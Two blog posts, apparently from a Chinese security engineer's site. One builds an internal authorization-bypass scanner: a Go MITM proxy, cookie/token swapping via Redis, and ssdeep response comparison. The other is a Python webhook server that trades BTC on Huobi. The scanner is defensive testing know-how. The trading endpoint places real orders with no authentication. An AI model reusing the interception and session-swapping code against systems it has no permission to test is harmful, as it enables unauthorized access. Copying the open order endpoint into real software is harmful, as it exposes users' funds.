[{"title":"越权扫描器碎碎念","date":"2020-12-14T08:27:15.000Z","path":"2020/12/14/bacscanner/","text":"碎碎念距离写这个小轮子已经过去半年多了，希望记录下来作为自己路上的一个沉淀，在行业里有人再次提起“越权扫描器”时能有一个从前端到后端、从代理到消费、从设计到使用的感性参考。 为什么要做这个东西？ 因为个人认为IAST、DAST方向的安全产品主要解决了OWASP Top 10中传统的具备可规则化的安全漏洞，比如sql注入、xss、rce等；而越权漏洞本质上可以归结为“逻辑”漏洞，逻辑类型的漏洞想要通过传统的扫描器捕获，从技术原理上来说是比较难的。比如一个功能从提出需求、评审到研发、测试、上线，每个人对它的理解都是不同的，可能研发三天不看这个代码都会忘记这个功能具体做了什么事情，指望一个不具备“智慧”大脑的扫描器理解它，并找到漏洞更是不可能的，甚至这个产品功能本身就是一个逻辑错误（类似于伪需求）。 在成熟的互联网企业，统一的公共服务，标准的研发规范，成熟的自动化流水线，再加上代码框架正逐渐步入内生安全，这一切使得传统的Web应用安全漏洞在可视范围内会越来越少。而越权漏洞可能因为研发忘记对某个参数做逻辑或归属校验，漏洞发生的限制条件很低，而造成的危害可能是极大的。 通俗点讲就是自动化难检测、易发生、高危害，但我们可以力所能及自动化一部分“水平”或“垂直”越权漏洞。 产品设计 代理谈到自动化，就少不了数据源的自动获取，比较常见的形式就是代理作为日志的生产者。市面上这么多类型的代理我们应该选择哪种既能满足高性能又能满足https的请求、响应体的全部呢？ MitmProxy123456789101112131415161718192021# -*- coding: utf-8 -*-#!/usr/bin/env python3import mitmproxy.httpfrom mitmproxy import ctx, httpimport timeclass ProxyScan: def request(self, flow: mitmproxy.http.HTTPFlow)-&gt; None: print('--------------------') print(flow.request.host) print(flow.request.url) print(flow.request.headers) print(flow.request.get_text()) print(flow.request.get_content()) print(flow.request.raw_content) # print(flow.request.path_components) print('--------------------')addons = [ ProxyScan()] mitmproxy4是官方维护的最新版本(调研时间2019年)，重构过后的新版本不再向下兼容，更稳定，并发更高。 但在测试过程中，发现通过burpsuite代理mitmproxy开启200线程并发发包，再通过mitmproxy进行代理浏览网页就会发现打开网页速度变慢。 Openresty跟同行(b5mali4)小明哥交流过程中，他当初落地实践的是openresty代理方案。 经测试发现，openresty并发非常高，在跟mitmproxy同样的测试条件下，再通过openresty进行代理浏览网页非常流畅。 GoproxyGoproxy地址：https://github.com/goproxy/goproxy 在学习时找到了猪猪侠3年前写的代理工具：https://github.com/ring04h/wyproxy2， 基本上把所需的功能已经都已经实现，只不过它是入库mysql，我们需要将解析后的数据打进“消息队列”。 在接公司的Mafka消息队列时顺便修正了代码上的一些小问题： 在Go 1.6之前， 内置的map类型是部分goroutine安全的，并发的读没有问题，并发的写可能有问题。自go 1.6之后， 并发地读写map会报错，这在一些知名的开源库中都存在这个问题，所以go 1.9之前的解决方案是额外绑定一个锁，封装成一个新的struct或者单独使用锁都可以。但是到了Go1.9发布，它有了一个新的特性，那就是sync.Map，它是原生支持并发安全的map，不过它的用法和以前我们熟悉的map完全不一样，主要还是因为sync.map封装了更为复杂的数据结构，以实现比之前加锁map更优秀的性能。package mainimport ( \"bytes\" \"encoding/json\" \"flag\" \"fmt\" \"github.com/elazarl/goproxy\" \"io/ioutil\" \"log\" \"net/http\" \"os\" \"regexp\" \"strconv\" \"strings\" \"sync\" \"time\")var ( // request.Body temp var // RequestBodyMap = make(map[int64][]byte) RequestBodyMap sync.Map // http static resource file extension static_ext []string = []string&#123; \"js\", \"css\", \"ico\", \"woff\", \"ttf\", \"map\", \"woff2\", &#125; // media resource files type media_types []string = []string&#123; \"image\", \"video\", \"audio\", &#125; // http static resource files static_types []string = []string&#123; \"application/vnd.google.octet-stream-compressible\", \"font/woff\", \"font/woff2\", \"text/css\", \"text/javascript\", \"baiduApp/json\", \"application/javascript\", \"application/x-javascript\", \"application/msword\", \"application/vnd.ms-excel\", \"application/vnd.ms-powerpoint\", \"application/x-ms-wmd\", \"application/x-shockwave-flash\", &#125;)func checkErr(err error) &#123; if err != nil &#123; log.Println(err) &#125;&#125;type Response struct &#123; Origin string `json:\"origin\"` Method string `json:\"method\"` Status int `json:\"status\"` ContentType string `json:\"content_type\"` ContentLength uint `json:\"content_length\"` Host string `json:\"host\"` Port string `json:\"port\"` URL string `json:\"url\"` Scheme string `json:\"scheme\"` Path string `json:\"path\"` Extension string `json:\"ext\"` ResponseHeader http.Header `json:\"response_header,omitempty\"` ResponseBody string `json:\"response_body,omitempty\"` RequestHeader http.Header `json:\"request_header,omitempty\"` RequestBody string `json:\"request_body,omitempty\"` DateStart time.Time `json:\"date_start\"` DateEnd time.Time `json:\"date_end\"`&#125;func handleRequest(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) &#123; reqbody, err := RequestBody(req) checkErr(err) // RequestBodyMap[ctx.Session] = reqbody RequestBodyMap.Store(ctx.Session, reqbody) // log.Println(req) return req, nil&#125;//func goHandleRequest()(*http.Request, *http.Response)&#123;//////&#125;func RequestBody(res *http.Request) ([]byte, error) &#123; buf, err := ioutil.ReadAll(res.Body) if err != nil &#123; return nil, err &#125; res.Body = ioutil.NopCloser(bytes.NewReader(buf)) // log.Printf(string(buf)) return buf, nil&#125;// json.Marshal方法优化，不对html做转义处理func MarshalHTML(v interface&#123;&#125;) ([]byte, error) &#123; var buf bytes.Buffer enc := json.NewEncoder(&amp;buf) enc.SetEscapeHTML(false) err := enc.Encode(v) if err != nil &#123; return nil, err &#125; return buf.Bytes(), nil&#125;func handleResponse(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response &#123; // Getting the Body reqbody, ok := RequestBodyMap.Load(ctx.Session) RequestBodyMap.Delete(ctx.Session) if ok != false &amp;&amp; resp != nil &#123; respbody, err := ResponseBody(resp) checkErr(err) // Attaching capture tool. if respbody != nil &#123; RespCapture := New(resp, reqbody.([]byte), respbody).Parser() static := NewResType( RespCapture.Extension, RespCapture.ContentType).isStatic() //log.Println(RespCapture) //tmpRespCapture := RespCapture if static != true &#123; jsonStr, err := MarshalHTML(RespCapture) if err != nil &#123; log.Fatal() &#125; //fmt.Println(jsonStr) //SynProducerCase(RespCapture) go func() &#123; //f, err := os.OpenFile(\"./log/scan.log\", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0666) //checkErr(err) //defer f.Close() //w := bufio.NewWriter(f) //w.WriteString(string(jsonStr)) //w.Flush() SynProducerCase(string(jsonStr)) &#125;() &#125; &#125; // fmt.Printf(\"%s\\n\", jsonStr) &#125; return resp&#125;func ResponseBody(res *http.Response) ([]byte, error) &#123; if res != nil &#123; defer res.Body.Close() &#125; buf, err := ioutil.ReadAll(res.Body) if err != nil &#123; return nil, err &#125; res.Body = ioutil.NopCloser(bytes.NewReader(buf)) return buf, nil&#125;func toJsonHeader(header http.Header) string &#123; js, err := json.Marshal(header) checkErr(err) return string(js)&#125;func New(resp *http.Response, reqbody []byte, respbody []byte) *ParserHTTP &#123; return &amp;ParserHTTP&#123;r: resp, reqbody: reqbody, respbody: respbody, s: time.Now()&#125;&#125;func NewResType(ext string, ctype string) *ResType &#123; var mtype string if ctype != \"\" &#123; mtype = strings.Split(ctype, \"/\")[0] &#125; return &amp;ResType&#123;ext, ctype, mtype&#125;&#125;type ParserHTTP struct &#123; r *http.Response reqbody []byte respbody []byte s time.Time&#125;type ResType struct &#123; ext string ctype string mtype string&#125;func (parser *ParserHTTP) Parser() Response &#123; var ( ctype string clength int StrHost string StrPort string ) if len(parser.r.Header[\"Content-Type\"]) &gt;= 1 &#123; ctype = GetContentType(parser.r.Header[\"Content-Type\"][0]) &#125; if len(parser.r.Header[\"Content-Length\"]) &gt;= 1 &#123; clength, _ = strconv.Atoi(parser.r.Header[\"Content-Length\"][0]) &#125; SliceHost := strings.Split(parser.r.Request.URL.Host, \":\") if len(SliceHost) &gt; 1 &#123; StrHost, StrPort = SliceHost[0], SliceHost[1] &#125; else &#123; StrHost = SliceHost[0] if parser.r.Request.URL.Scheme == \"https\" &#123; StrPort = \"443\" &#125; else &#123; StrPort = \"80\" &#125; &#125; now := time.Now() r := Response&#123; Origin: parser.r.Request.RemoteAddr, Method: parser.r.Request.Method, Status: parser.r.StatusCode, ContentType: string(ctype), ContentLength: uint(clength), Host: StrHost, Port: StrPort, URL: parser.r.Request.URL.String(), Scheme: parser.r.Request.URL.Scheme, Path: parser.r.Request.URL.Path, Extension: GetExtension(parser.r.Request.URL.Path), ResponseHeader: parser.r.Header, ResponseBody: string(parser.respbody), RequestHeader: parser.r.Request.Header, RequestBody: string(parser.reqbody), DateStart: parser.s, DateEnd: now, &#125; return r&#125;func (r *ResType) isStatic() bool &#123; if ContainsString(static_ext, r.ext) &#123; return true &#125; else if ContainsString(static_types, r.ctype) &#123; return true &#125; else if ContainsString(media_types, r.mtype) &#123; return true &#125; return false&#125;func GetContentType(HeradeCT string) string &#123; ct := strings.Split(HeradeCT, \"; \")[0] return ct&#125;func GetExtension(path string) string &#123; SlicePath := strings.Split(path, \".\") if len(SlicePath) &gt; 1 &#123; return SlicePath[len(SlicePath)-1] &#125; return \"\"&#125;func ContainsString(sl []string, v string) bool &#123; for _, vv := range sl &#123; if vv == v &#123; return true &#125; &#125; return false&#125;func PathExists(path string) (bool, error) &#123; _, err := os.Stat(path) if err == nil &#123; return true, nil &#125; if os.IsNotExist(err) &#123; return false, nil &#125; return false, err&#125;func main() &#123; //stopper_cpu := profile.Start(profile.CPUProfile, profile.ProfilePath(\".\")) //defer stopper_cpu.Stop() //stopper_mem := profile.Start(profile.MemProfile, profile.ProfilePath(\".\")) //defer stopper_mem.Stop() //stopper_mutex := profile.Start(profile.MutexProfile, profile.ProfilePath(\".\")) //defer stopper_mutex.Stop() //stopper_block := profile.Start(profile.BlockProfile, profile.ProfilePath(\".\")) //defer stopper_block.Stop() fmt.Println(\"Proxy start\") // 定义代理日志目录 _dir := \"log\" exist, err := PathExists(_dir) if err != nil &#123; fmt.Printf(\"get dir error![%v]\\n\", err) return &#125; if exist &#123; fmt.Printf(\"Proxy log dir -&gt; [%v]\\n\", _dir) &#125; else &#123; fmt.Printf(\"No proxy log dir -&gt; [%v]\\n\", _dir) // 创建代理目录 err := os.Mkdir(_dir, os.ModePerm) if err != nil &#123; fmt.Printf(\"Mkdir proxy log failed![%v]\\n\", err) &#125; else &#123; fmt.Printf(\"Mkdir proxy log success!\\n\") &#125; &#125; verbose := flag.Bool(\"v\", false, \"should every proxy request be logged to stdout\") addr := flag.String(\"l\", \":8080\", \"on which address should the proxy listen\") flag.Parse() proxy := goproxy.NewProxyHttpServer() proxy.Verbose = *verbose log.Printf(\"Listening %s \\n\", *addr) log.Printf(\"proxy Start success... \\n\") log.Println(goproxy.ReqHostMatches()) proxy.OnRequest(goproxy.ReqHostMatches(regexp.MustCompile(`^.*\\.(test|dev)\\.(gongsi|yuming)\\.com:443$`))).HandleConnect(goproxy.AlwaysMitm) proxy.OnRequest(goproxy.ReqHostMatches(regexp.MustCompile(`(.*\\.(test|dev)\\.(gongsi|yuming)\\.com|10\\.\\d+\\.\\d+\\.\\d+)$`))).DoFunc(handleRequest) proxy.OnResponse().DoFunc(handleResponse) log.Fatal(http.ListenAndServe(*addr, proxy))&#125; 最终选择了goproxy，因为openresty相当于用nginx+lua开发，需要打补丁对https流量进行获取，打补丁后可以获取https的host，但始终无法获取请求体等。 Goproxy最终效果：Charles+Http；Charles+Https；Burpsuite+Http；Burpsuite+Https均可以正常代理，数据进入消息队列。 越权扫描器生产者流量有了，剩下就是核心越权扫描器引擎。 思路简单来说就是“换Cookie”，即替换请求凭证，这里可能是Cookie中的token字段值、可能是header中BA认证的字段值，每个公司的情况不一。我们公司叫token，你们公司可能叫session或者sid等，甚至可能还没统一的身份认证机制，那我们替换的就是整个cookie值。 这相当于根据“换Cookie”请求后响应的不同来判断是否存在越权，比如原始请求的响应为“phone=170221”，替换成别人cookie后的响应为仍然为“phone=170221”，那就极可能是一个越权漏洞，这也是大家常用来测试越权漏洞的方法（或者通过遍历参数，如orderid之类）。 详细思路 1）围绕着“换Cookie”的核心，我们将原始请求的响应叫做ResponseA，删除ssoid的响应叫做ResponseB，替换ssoid后的响应叫做ResponseC。2）进一步通过删除ssoid、替换ssoid，对重新封装的请求分别发包，对3个Response的对比判断是否存在越权漏洞。3）对比的方法我这里做了一个取巧的方式，通过相似度匹配，相似度定义为风险值，即相似度越高风险值也越大，越权漏洞发生的可能性越大。相似度匹配的算法使用ssdeep（ssdeep也常用于webshell检测）。 bacLogic.go我们通过代码来梳理一下具体实现逻辑，在函数bacRequest中把流量日志logPayload反序列化成[]byte的json格式的reqLog，通过reqLog.RequestHeader取出header数据，然后通过processCookie函数，用change字符串“删”或“替换”作为入参判断，对header内关键的认证字段进行改变。接着下面代码会对原始请求取reqLog.Method判断是“GET”请求，还是“POST”请求，将改变后的header、原始reqLog.URL、原始的reqLog.RequestBody重发包，这时riskBac函数会对重发包的响应 []byte(r.String())与原始响应firstResp进行对比，计算riskValue风险值（相似度）。最后通过httpLogUpdate将需要的数据插入Mysql数据库做后续的结果展示等。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566package mainimport ( \"encoding/json\" \"fmt\" \"github.com/imroc/req\" \"log\")func bacRequest(logPayload string, change string, id int64) &#123; var reqLog Response //fmt.Println(string(logPayload)) err := json.Unmarshal([]byte(logPayload), &amp;reqLog) //把流量日志logPayload反序列化成[]byte的json格式的reqLog if err != nil &#123; fmt.Println(\"json Unmarshal failed:\", err) &#125; //resJsonBool := strings.Contains(reqLog.ResponseHeader.Get(\"Content-Type\"), \"application/json\") header, err := processCookie(reqLog.RequestHeader, change) if err != nil &#123; log.Println(\"处理header错误：\", err) return &#125; firstResp := []byte(reqLog.ResponseBody) // firstResp 是原始请求里的Response if reqLog.Method == \"GET\" &#123; r, _ := req.Get(reqLog.URL, header) // Request请求开始 //log.Println(\"修改请求的响应：\",r.String()) //Mysql riskValue := riskBac(firstResp, []byte(r.String())) //log.Println(\"相似度的值为: \",riskValue) reqHeader, _ := json.Marshal(r.Request().Header) //reqBody, err := json.Marshal(r.Request().Body) //空 respHeader, _ := json.Marshal(r.Response().Header) //log.Println(respHeader) httpLogUpdate(string(reqHeader), reqLog.RequestBody, string(respHeader), r.String(), id, change, riskValue) &#125; else if reqLog.Method == \"POST\" &#123; // 1. 看Content-type，如果是json，就要用req的json方法请求； header.Del(\"Content-Length\") r, err := req.Post(reqLog.URL, header, reqLog.RequestBody) if err != nil &#123; log.Println(\"POST请求失败：\", err) &#125; riskValue := riskBac(firstResp, []byte(r.String())) reqHeader, _ := json.Marshal(r.Request().Header) //reqBody, err := json.Marshal(r.Request().Body) //空 respHeader, _ := json.Marshal(r.Response().Header) httpLogUpdate(string(reqHeader), reqLog.RequestBody, string(respHeader), r.String(), id, change, riskValue) &#125; else if reqLog.Method == \"OPTIONS\" &#123; r, err := req.Options(reqLog.URL, header, reqLog.RequestBody) if err != nil &#123; log.Println(\"OPTIONS请求失败：\", err) &#125; riskValue := riskBac(firstResp, []byte(r.String())) reqHeader, _ := json.Marshal(r.Request().Header) //reqBody, err := json.Marshal(r.Request().Body) //空 respHeader, _ := json.Marshal(r.Response().Header) httpLogUpdate(string(reqHeader), reqLog.RequestBody, string(respHeader), r.String(), id, change, riskValue) &#125;&#125; cookie.go123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687package mainimport ( \"github.com/go-redis/redis\" \"log\" \"net/http\" \"regexp\" \"strings\")func getSSOid(keySsoid string) string &#123; // 建立redis连接 client := redis.NewClient(&amp;redis.Options&#123; Addr: appConfig.redisAddr, Password: appConfig.redisPass, DB: 1, &#125;) defer client.Close() ping, err := client.Ping().Result() if err != nil &#123; log.Println(\"Redis client connect failed ping status:\", err) &#125; log.Println(\"ping status:\", ping) ssoid, err := client.Get(keySsoid).Result() if err != nil &#123; log.Println(\"Get redis key value failed:\", err) &#125; if len(ssoid) &lt; 5 &#123; log.Println(\"error: ssoid value length &lt; 5\") return \";\" &#125; return ssoid&#125;func processCookie(headerInput http.Header, change string) (http.Header, error) &#123; header := headerInput // BA认证变更 Access_token := header.Get(\"access-token\") if len(Access_token) &gt; 10 &#123; // 删除Cookie if change == \"del\" &#123; // 把ssoid的值全部替换为空并替换Header头中的Cookie字段 header.Set(\"access-token\", \"\") //替换Cookie &#125; else &#123; newSSOid := getSSOid(change) header.Set(\"access-token\", newSSOid) &#125; &#125; Cookie := header.Get(\"Cookie\") // 通过正则取出ssoid=xxx; reg := regexp.MustCompile(`[.\\w]*(ssoid|SSOID|SSO_ID|sso_id|sso_sid|SSO_SID|TGCX)=[0-9a-zA-Z-_*]+`) //log.Println(reg.FindAllString(Cookie, -1)) client_id := reg.FindAllString(Cookie, -1) //log.Println(client_id) //log.Println(len(client_id)) if len(client_id) &gt; 0 &#123; for _, ssoid_value := range client_id &#123; cookieArray := strings.Split(ssoid_value, \"=\") //将cookie=abc;根据等号分割成数组[cookie abc] //ssoid := cookieArray[0] // com.hello.it.ead.cihah_ssoid oldSsoidVal := cookieArray[1] // abc; if len(oldSsoidVal) &gt; 20 &#123; //删除Cookie if change == \"del\" &#123; // 把ssoid的值全部替换为空并替换Header头中的Cookie字段 Cookie = strings.Replace(Cookie, oldSsoidVal, \";\", -1) //替换Cookie &#125; else if (change == \"ssoid-offline\") || (change == \"ssoid-online\") &#123; newSSOid := getSSOid(change) Cookie = strings.Replace(Cookie, oldSsoidVal, newSSOid+\";\", -1) &#125; else &#123; log.Println(\"change 标识错误\") &#125; &#125; else &#123; log.Println(\"Cookie获取失败：\", cookieArray) &#125; &#125; header.Set(\"Cookie\", Cookie) &#125; return header, nil&#125; risk.go12345678910111213141516171819202122232425262728293031323334package mainimport ( \"github.com/glaslos/ssdeep\" \"log\")//通过比较日志response和二次请求中的response相似作为越权风险值func riskBac(firstResp []byte, afterResp []byte) int &#123; if len(firstResp) &lt; 30 || len(afterResp) &lt; 30 &#123; return 30 &#125; h1, err := ssdeep.FuzzyBytes(firstResp) if err != nil &#123; log.Println(\"ssdeep h1 error:\", err) &#125; //log.Println(h1) h2, err := ssdeep.FuzzyBytes(afterResp) if err != nil &#123; log.Println(\"ssdeep h2 error:\", err) &#125; //log.Println(h2) var score int score, err = ssdeep.Distance(h1, h2) if err != nil &#123; log.Println(\"ssdeep distance failed.\") &#125; log.Println(score) return score&#125; “替换的cookie”来自哪里？crontab.go用来做第三者的“替换cookie”也是极其重要的，它决定了在越权检测中准确性的高低。针对公司内网使用SSO进行认证的应用，我在公司申请了虚拟账号，将此账号的权限设置成最低，通过定时任务每天凌晨对认证服务进行一次请求，获取“鲜活”的cookie，用于替换和删除。 从下面代码可以看到每天凌晨1点，去走一次认证流程，将凭证存入redis，其中对业务进行了区分，比如SSO的应用，C端的应用生活费、助贷、分期，对C端不同业务制造出不同状态的账号。为什么要这样？我将在文章最后进行简单解释。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169package mainimport ( \"errors\" \"github.com/go-redis/redis\" \"github.com/imroc/req\" \"github.com/jakecoffman/cron\" \"io\" \"log\" \"os\")type cookieMT struct &#123; //ssoOnlineURL string ssoOfflineURL string&#125;type tokenMT struct &#123; tokenOfflineURL string // 线下C端用户中心passport生成token地址 expenses string // 生活费，已授信，未借款 账号 diversion string // 已开通助贷（马上），未借款 账号 instalment string // 已开通分期，未借款 账号&#125;// 获取线下环境ssoid的值func (c cookieMT) Runssoff() (string, error) &#123; var resp map[string]interface&#123;&#125; // Request请求开始 r, err := req.Get(c.ssoOfflineURL) // 线下sso地址 if err != nil &#123; Error.Println(\"SSO Offline URL request failed:\", err) &#125; err = r.ToJSON(&amp;resp) if err != nil &#123; Error.Println(\"SSO Offline URL response r.ToJSON failed:\", err) &#125; // interface convert to string if resp[\"data\"] == nil &#123; return \"null\", errors.New(\"获取线下ssoid为空\") &#125; return resp[\"data\"].(string), nil&#125;func (t tokenMT) Runtokenoff(phone string) (string, error)&#123; // Request请求开始 r, err := req.Get(t.tokenOfflineURL+phone) // 线下sso地址 if err != nil &#123; Error.Println(\"Token Offline URL request failed:\", err) &#125; resp := r.String() return resp, nil&#125;// 存线下的ssoid到reids里func redisSsoOff(client *redis.Client, key string, ssoid string) &#123; setStatus := client.Set(key, ssoid, 0) Info.Println(\"redis setStatus:\", setStatus)&#125;func redisTokenOff(client *redis.Client, key string, ssoid string) &#123; setStatus := client.Set(key, ssoid, 0) Info.Println(\"redis setStatus:\", setStatus)&#125;var mainCron *cron.Cron// 定义日志全局变量var ( Info *log.Logger Warning *log.Logger Error *log.Logger)// 日志初始化配置func init() &#123; errFile, err := os.OpenFile(\"errors.log\", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666) if err != nil &#123; log.Fatalln(\"打开日志文件失败：\", err) &#125; Info = log.New(os.Stdout, \"Info:\", log.Ldate|log.Ltime|log.Lshortfile) Warning = log.New(os.Stdout, \"Warning:\", log.Ldate|log.Ltime|log.Lshortfile) Error = log.New(io.MultiWriter(os.Stderr, errFile), \"Error:\", log.Ldate|log.Ltime|log.Lshortfile)&#125;func redisTask() &#123; cookies := cookieMT&#123; //ssoOnlineURL: \"http://test.com/hahaservice/get?id=pirogue&amp;password=\", ssoOfflineURL: \"http://test.com/hahaservice/offline/get?id=pirogue&amp;password=\", &#125; tokens := tokenMT&#123; tokenOfflineURL: \"http://gege.test.com/api/token?q=\", expenses: \"15xxxxxxxxx\", diversion: \"13xxxxxxxxx\", instalment: \"13xxxxxxxxx\", &#125; // 建立redis连接 client := redis.NewClient(&amp;redis.Options&#123; Addr: \"localhost:1234\", Password: \"xxxxxxxxxx\", DB: 1, &#125;) ping, err := client.Ping().Result() if err != nil &#123; Error.Println(\"Redis client connect failed ping status:\", err) &#125; Info.Println(\"ping status:\", ping) defer client.Close() // 请求线上接口获取ssoid //ssoidOnline, err := cookies.Runssonline() //if err != nil &#123; // Error.Println(err) //&#125; // 请求线下接口获取ssoid ssoidOffline, err := cookies.Runssoff() if err != nil &#123; Error.Println(err) &#125; tokenOfflineExpenses , err := tokens.Runtokenoff(tokens.expenses) if err != nil &#123; Error.Println(err) &#125; tokenOfflineDiversion , err := tokens.Runtokenoff(tokens.diversion) if err != nil &#123; Error.Println(err) &#125; tokenOfflineInstalment , err := tokens.Runtokenoff(tokens.instalment) if err != nil &#123; Error.Println(err) &#125; redisSsoOff(client, \"ssoid-offline\", ssoidOffline) redisTokenOff(client, \"token-expenses\", tokenOfflineExpenses) redisTokenOff(client, \"token-diversion\", tokenOfflineDiversion) redisTokenOff(client, \"token-instalment\", tokenOfflineInstalment) //redisSsoOn(client, \"ssoid-online\", ssoidOnline)&#125;func main() &#123; mainCron = cron.New() // AddJob tasktime := \"0 0 1 * * ?\" //每天凌晨1点 //tasktime := \"0 0/1 * * * ? \" //每2分钟 mainCron.AddFunc(tasktime, redisTask, \"ssopassport\") mainCron.Start() select &#123;&#125; //阻塞主线程不退出&#125; 扫描器后台扫描器后台是直接提供给用户使用的，所以产品的界面核心功能（漏洞展示）是否直观、使用是否繁琐、是否有使用上的技术门槛直接决定了这款产品最终能否能被终端客户所接受。 为什么要提到“技术门槛”？在日常工作中，我发现不同的人对使用上的“技术门槛”的接受程度是不一样的，有人觉得“Burpsuite”门槛就十分高了。如果你的产品存在此类“技术门槛”，到最后只能成为摆设或通过外包服务的方式变相使用，最终成为自己人用的产品。 核心功能是否直观？在这个产品的设计过程中，核心功能就是越权漏洞的Response对比，如果能让人一眼看出哪些请求接口存在越权，那就成功了一半。但实际上我在使用的过程中虽然有“风险值”作为参考排序，通过肉眼判断对比response列表，点击列表展开仍然非常“繁琐”，甚至于接口太多导致手点的麻木了。后期为了设计一个人性化的界面，思考良久，也“偷窥”了一下行业内做的比较好的一家乙方产品，发现其类似功能也是需要点击列表进而查看漏洞比对的详情，所以这类核心功能要想最终能够较好的落地，是需要实践检验的，离不开开源交流和思想碰撞。 Demo展示后台代码就非常多了，后端使用gin作为Web框架，vue作为前端框架，最终我也将awvs这个主动扫描器作为被动扫描器的引擎加入到后端，包括同事用python写的扫描器轮子。 点击“创建目标”创建扫描任务，创建完成扫描目标后，点击“常规扫描”将调用awvs进行常规漏洞扫描；点击“越权扫描”对任务进行后端“替换cookie”的配置 在弹窗的对话框中，选择是使用“SSO“的虚拟账号，还是选择”Passport“的“生活费”账号、生意贷账号等进行凭证的替换和删除。 可以看到风险值高的接口排在最上，其他字段还有host、method、url，是不是有点像web版本的burpsuite。点击蓝色的“结果”就会弹出3个Response的对比。如果这里的接口非常多，使用上将会非常麻烦，你就要点击上百次“结果”查看（今天工位的MAC触控板格外的烫手，富婆还是没有出现，我的心好累）。 抛砖引玉没有服务意识的网络安全爱好者不是一个好的打工人…如果想从用户体验、功能实用的角度出发设计一个好的越权扫描器显然我写的轮子是失败的，越到后面功能上的细节考虑的越多，越要贴合业务。比如用户账号这一块，从QA小姐姐那里调研才知道一个BU的业务线不同产品的用户体系也会不同，账号的授信与否决定了后面逻辑是可以请求成功。 畅想一下未来，也许越权扫描也会出现对应的场景规则，比如贷款类业务、打车类业务、保险类业务，比如身份证号、银行卡号、手机号，沉淀规则，打磨框架，自动化越权检测更通用和便捷。","tags":[{"name":"golang","slug":"golang","permalink":"http://pirogue.org/tags/golang/"},{"name":"越权","slug":"越权","permalink":"http://pirogue.org/tags/越权/"},{"name":"扫描器","slug":"扫描器","permalink":"http://pirogue.org/tags/扫描器/"}]},{"title":"币圈量化交易试水","date":"2020-06-24T15:15:33.000Z","path":"2020/06/24/quant/","text":"说明去年杂七杂八看了一些量化交易的视频算是入了门。本地回测的库有Catalyst（基于zipline）、vnpy、Zipline。 这篇文章是一个简单的Tradingview（也可以回测）交易策略通过自己写的python web程序对接火币交易所进行现货买卖的demo。 简单来说：Tradingview webhook-&gt;python web-&gt; huobi 步骤注册Tradingviewhttps://cn.tradingview.com/ 打开首页你就会发现很多别人已经写好的策略在进行展示，但这些策略往往应用于其他传统金融市场，而不是数字货币。而对于我这种不懂交易会写一点点代码的人只能用别人的策略在币圈进行回测优化。 打开脚本页面https://cn.tradingview.com/scripts/ 这个页面里就是所有的开源策略。 选其中一个你认为还不错的，进行我们下面关键的web hook设置。 我这里随便举个例子：比如选SuperTrend策略,点“添加至收藏脚本” 点击图表按钮 选择btcusdt的图表布局 左侧出现的就是btc的k线图 选择收藏的脚本应用到图表上 点击“指标&amp;策略”,然后点击你收藏的“SuperTrend”策略脚本，这时你看图中的数字3那里，就出现了策略在盘面的走势应用图，比如箭头所指的sell，就是策略给的卖出信号。 看上图，没想到这个策略在今天还是挺准的，如果都在它给的点位买入卖出或者做多做空，应该是能赚到钱的。 注：本人没有用它做实盘策略，自己要用请自行评估。 添加信号告警这一步是本篇文章的重点，就是如何使用tradingview的Webhook对接python web程序。tradingview我下文统一叫tv吧，太长了不好打字。 点击“警报”图标，会弹出一个对话框。 点击下拉，选中supertrend策略。 注意我红框里面选中的内容，第一个框是选策略，第二个框是策略的买入信号（待会儿我们还要创建一个卖出信号的警告），第三个框是“每根K线一次”，简单的解释就是可以一直跑，一旦符合指标就提示，其他的选项就是用一次就停止了之类的，不过多解释了。最后点创建，如果不接入webhook的话，平时人工盯盘这样用就足够了。 但是量化重点在webhook，下面我们介绍如何接入它。 先给出python的web程序代码: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#!/usr/bin/env python3# -*- encoding: utf-8 -*-&apos;&apos;&apos;@File : huobi.py@Time : 2020/01/10 00:07:06@Author : pirogue @Version : 1.0@Contact : p1r06u3@gmail.com@License : (C)Copyright 2019-2020, Pirogue@Desc : Tradingview webhook通知webserver对接火币交易所进行现货买卖 &apos;&apos;&apos;import ccxtimport timeimport jsonimport tornado.webimport tornado.ioloopex = ccxt.huobipro(&#123; &apos;apiKey&apos;: &apos;填自己的&apos;, &apos;secret&apos;: &apos;填自己的&apos;, &apos;options&apos;: &#123; &apos;createMarketBuyOrderRequiresPrice&apos;: False, # switch off &#125;,&#125;)def get_assets(): btc_count = ex.fetch_balance()[&quot;BTC&quot;] print(btc_count) # 账户正在使用的btc #btc_used = btc_count[&quot;used&quot;] btc_free = btc_count[&quot;free&quot;] return btc_freedef sell_btc(): btc_count = get_assets() symbol = &apos;BTC/USDT&apos; ex.create_market_sell_order(symbol,btc_count)def buy_btc(): symbol = &apos;BTC/USDT&apos; amount = 0.9 # BTC price = 9000 # USDT cost = amount*price ex.createMarketBuyOrder(symbol, cost)class MainHandler(tornado.web.RequestHandler): def get(self): buy = self.get_arguments(&quot;buy&quot;) sell = self.get_arguments(&quot;sell&quot;) if buy: buy_btc() if sell: sell_btc() self.write(&quot;Hello,Tornado.&quot;) def post(self): buy = self.get_arguments(&quot;buy&quot;) sell = self.get_arguments(&quot;sell&quot;) if buy: buy_btc() if sell: sell_btc() self.write(&quot;Hello,Tornado.&quot;)# def make_app():# return tornado.web.Application([# (r&quot;/btc&quot;,MainHandler),# ]) if __name__==&quot;__main__&quot;: app = tornado.web.Application([(r&apos;/btc&apos;,MainHandler)]) app.listen(80) tornado.ioloop.IOLoop.current().start() 这段程序用到了两个python类库，一个是tornado做web，一个ccxt与交易所api对接。 ccxt 是 github上最火热的加密货币交易库， 包含了近百个交易所api。支持 Python、JavaScript、PHP 三种语言调用。对于这个行业来说，各个交易所 API 签名方式、数据结构都不相同，如果一个个接入适配可以说费时费力，ccxt的出现解决了这个问题。 